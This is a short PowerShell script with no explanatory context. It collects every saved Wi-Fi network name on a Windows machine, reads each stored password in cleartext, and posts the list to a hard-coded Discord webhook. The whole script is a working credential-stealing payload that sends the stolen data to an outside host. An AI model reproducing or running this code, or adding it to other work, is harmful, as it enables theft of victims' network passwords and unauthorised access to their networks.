$wifi = (netsh wlan show profiles) | Select-String 'All User Profile' | ForEach-Object { ($_ -split ': ')[1].Trim() } | ForEach-Object { 
    $ssid = $_
    $pwd = (netsh wlan show profile name="$ssid" key=clear | Select-String 'Key Content' | ForEach-Object { ($_ -split ': ')[1].Trim() })
    "$ssid : $pwd"
}
$payload = @{content = ('```\n' + ($wifi -join "`n") + '\n```') } | ConvertTo-Json -Compress
Invoke-RestMethod -Uri 'https://discord.com/api/webhooks/1348596367936716841/q-6dCI0Q1RPRKizEpmBBSGCbfZZKA5eB6zGsrt-N4ONPBTVHuCnqFzcD1PRAmPPlie6a' -Method Post -Body $payload -ContentType 'application/json'
